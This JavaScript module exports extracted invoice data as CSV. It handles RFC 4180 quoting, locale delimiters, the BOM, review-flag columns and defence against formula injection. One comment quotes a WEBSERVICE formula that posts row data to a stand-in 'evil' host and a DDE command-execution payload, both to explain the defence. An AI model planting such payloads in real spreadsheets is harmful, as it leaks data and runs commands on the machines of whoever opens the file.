// CSV export. Small, but the details here are what make a file open cleanly in real accounting
// software instead of producing a support ticket.
"use strict";

// A value starting with any of these is a FORMULA to Excel, LibreOffice and Google Sheets, not
// text. Quoting does not help: the quotes are stripped and then the cell is evaluated.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

// RFC 4180 quoting, plus formula neutralisation.
//
// The values here come out of a PDF that a third party sent us, so they are attacker-controlled,
// and the exported file is opened in accounting software by design. A supplier field reading
// `=WEBSERVICE("http://evil/?d="&A2)` silently posts the rest of the row to a stranger the moment
// the CSV is opened, and the DDE forms (`=cmd|'/C ...'!A0`) prompt to run a command. Prefixing a
// single quote is the standard mitigation: the cell displays as typed and is inert everywhere.
//
// Numbers are exempt (see toCsv), so a negative amount stays a negative amount.
function cell(v, { neutralise = true } = {}) {
  let s = v === null || v === undefined ? "" : String(v);
  // Control characters corrupt the file and can hide the real start of a value.
  s = s.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F]/g, " ");
  if (neutralise && FORMULA_LEAD.test(s)) s = "'" + s;
  return /[",\n\r;\t]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

// delimiter: "," is standard; ";" is what a French, German, Spanish or Italian Excel expects,
// because those locales use the comma as a decimal mark. Getting this wrong is the single most
// common reason a CSV lands in one column, so it is a user choice, not a hardcoded guess.
// decimalComma: writes 1234.56 as "1234,56" for the same locales.
// Two extra columns are always appended, and they are not decoration:
//   source_file   - without it, a suspect row cannot be traced back to the document it came from.
//   needs_review  - a document the model failed on used to export as ",,,,0.00,0.00,0.00", which is
//                   indistinguishable from a genuine zero-rated invoice. The amber flag the user
//                   sees on screen has to survive into the file, or the warning dies at the export.
function toCsv(fields, rows, { delimiter = ",", decimalComma = false, bom = true, meta = true } = {}) {
  const head = fields.map((f) => cell(f.label));
  if (meta) head.push(cell("source_file"), cell("needs_review"));
  const header = head.join(delimiter);
  const body = rows.map((r) => {
    const out = fields.map((f) => {
      let v = r.values ? r.values[f.key] : "";
      if (f.type === "number" && typeof v === "number") {
        v = v.toFixed(2);
        if (decimalComma) v = v.replace(".", ",");
        // A formatted number is ours, not the document's, so it never needs neutralising. This also
        // keeps a negative amount as -1234.56 instead of '-1234.56.
        return cell(v, { neutralise: false });
      }
      return cell(v);
    });
    if (meta) {
      const flagged = Array.isArray(r.missing) ? r.missing : [];
      out.push(cell(r.name || r.file || ""));
      out.push(cell(flagged.length ? `CHECK: ${flagged.join(" ")}` : ""));
    }
    return out.join(delimiter);
  });
  // A BOM is what makes Excel on Windows read UTF-8 correctly. Without it, accented supplier
  // names arrive mangled, which is the second most common CSV complaint.
  return (bom ? "﻿" : "") + [header, ...body].join("\r\n") + "\r\n";
}

module.exports = { toCsv, cell };
